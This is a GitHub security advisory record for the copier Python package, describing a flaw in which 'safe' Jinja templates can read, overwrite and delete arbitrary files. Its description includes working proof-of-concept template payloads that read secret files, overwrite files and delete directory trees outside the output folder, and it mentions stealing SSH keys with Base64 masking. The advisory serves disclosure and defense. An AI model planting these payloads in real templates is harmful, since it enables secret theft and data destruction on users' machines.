{
  "Severity": "HIGH",
  "UpdatedAt": "2025-08-18T21:00:23Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "copier"
  },
  "Advisory": {
    "DatabaseId": 307942,
    "Id": "GSA_kwCzR0hTQS0zeHc3LXY2Y2otNXE4aM4ABLLm",
    "GhsaId": "GHSA-3xw7-v6cj-5q8h",
    "References": [
      {
        "Url": "https://github.com/copier-org/copier/security/advisories/GHSA-3xw7-v6cj-5q8h"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-55201"
      },
      {
        "Url": "https://github.com/copier-org/copier/commit/3feea3b3ff3c20d80cbb16a2f3b9567ffc5606d1"
      },
      {
        "Url": "https://github.com/advisories/GHSA-3xw7-v6cj-5q8h"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-3xw7-v6cj-5q8h"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-55201"
      }
    ],
    "Description": "### Impact\n\nCopier's current security model shall restrict filesystem access through Jinja:\n\n- Files can only be read using `{% include ... %}`, which is limited by Jinja to reading files from the subtree of the local template clone in our case.\n- Files are written in the destination directory according to their counterparts in the template.\n\nCopier suggests that it's safe to generate a project from a safe template, i.e. one that doesn't use [unsafe](https://copier.readthedocs.io/en/stable/configuring/#unsafe) features like custom Jinja extensions which would require passing the `--UNSAFE,--trust` flag. As it turns out, a safe template can currently read and write arbitrary files because we expose a few `pathlib.Path` objects in the Jinja context which have unconstrained I/O methods. This effectively renders our security model w.r.t. filesystem access useless.\n\n#### Arbitrary read access\n\nImagine, e.g., a malicious template author who creates a template that reads SSH keys or other secrets from well-known locations, perhaps \"masks\" them with Base64 encoding to reduce detection risk, and hopes for a user to push the generated project to a public location like [github.com](http://github.com/) where the template author can extract the secrets.\n\nReproducible example:\n\n- Read known file:\n\n    ```shell\n    echo \"s3cr3t\" \u003e secret.txt\n    mkdir src/\n    echo \"stolen secret: {{ (_copier_conf.dst_path / '..' / 'secret.txt').resolve().read_text('utf-8') }}\" \u003e src/stolen-secret.txt.jinja\n    uvx copier copy src/ dst/\n    cat dst/stolen-secret.txt\n    ```\n\n- Read unknown file(s) via globbing:\n\n    ```shell\n    mkdir secrets/\n    echo \"s3cr3t #1\" \u003e secrets/secret1.txt\n    echo \"s3cr3t #2\" \u003e secrets/secret2.txt\n    mkdir src/\n    cat \u003c\u003c'EOF' \u003e src/stolen-secrets.txt.jinja\n    stolen secrets:\n    {% set parent = (_copier_conf.dst_path / '..' / 'secrets').resolve() %}\n    {% for f in parent.glob('*.txt') %}\n    {{ f }}: {{ f.read_text('utf-8') }}\n    {% endfor %}\n    EOF\n    uvx copier copy src/ dst/\n    cat dst/stolen-secrets.txt\n    ```\n\n#### Arbitrary write access\n\nImagine, e.g., a malicious template author who creates a template that overwrites or even deletes files to cause havoc.\n\nReproducible examples:\n\n- Overwrite known file:\n\n    ```shell\n    echo \"s3cr3t\" \u003e secret.txt\n    mkdir src/\n    echo \"{{ (_copier_conf.dst_path / '..' / 'secret.txt').resolve().write_text('OVERWRITTEN', 'utf-8') }}\" \u003e src/malicious.txt.jinja\n    uvx copier copy src/ dst/\n    cat secret.txt\n    ```\n\n- Overwrite unknown file(s) via globbing:\n\n    ```shell\n    echo \"s3cr3t\" \u003e secret.txt\n    mkdir src/\n    cat \u003c\u003c'EOF' \u003e src/malicious.txt.jinja\n    {% set parent = (_copier_conf.dst_path / '..').resolve() %}\n    {% for f in (parent.glob('*.txt') | list) %}\n    {{ f.write_text('OVERWRITTEN', 'utf-8') }}\n    {% endfor %}\n    EOF\n    uvx copier copy src/ dst/\n    cat secret.txt\n    ```\n\n- Delete unknown file(s) via globbing:\n\n    ```shell\n    echo \"s3cr3t\" \u003e secret.txt\n    mkdir src/\n    cat \u003c\u003c'EOF' \u003e src/malicious.txt.jinja\n    {% set parent = (_copier_conf.dst_path / '..').resolve() %}\n    {% for f in (parent.glob('*.txt') | list) %}\n    {{ f.unlink() }}\n    {% endfor %}\n    EOF\n    uvx copier copy src/ dst/\n    cat secret.txt\n    ```\n\n- Delete unknown files and directories via tree walking:\n\n    ```shell\n    mkdir data\n    mkdir data/a\n    mkdir data/a/b\n    echo \"foo\" \u003e data/foo.txt\n    echo \"bar\" \u003e data/a/bar.txt\n    echo \"baz\" \u003e data/a/b/baz.txt\n    tree data/\n    mkdir src/\n    cat \u003c\u003c'EOF' \u003e src/malicious.txt.jinja\n    {% set parent = (_copier_conf.dst_path / '..' / 'data').resolve() %}\n    {% for root, dirs, files in parent.walk(top_down=False) %}\n    {% for name in files %}\n    {{ (root / name).unlink() }}\n    {% endfor %}\n    {% for name in dirs %}\n    {{ (root / name).rmdir() }}\n    {% endfor %}\n    {% endfor %}\n    EOF\n    uvx copier copy src/ dst/\n    tree data/\n    ```",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-08-18T21:00:23Z",
    "Severity": "HIGH",
    "Summary": "Copier's safe template has arbitrary filesystem read/write access",
    "UpdatedAt": "2025-08-19T05:00:50Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "9.9.1"
      },
      "VulnerableVersionRange": "\u003c 9.9.1"
    }
  ]
}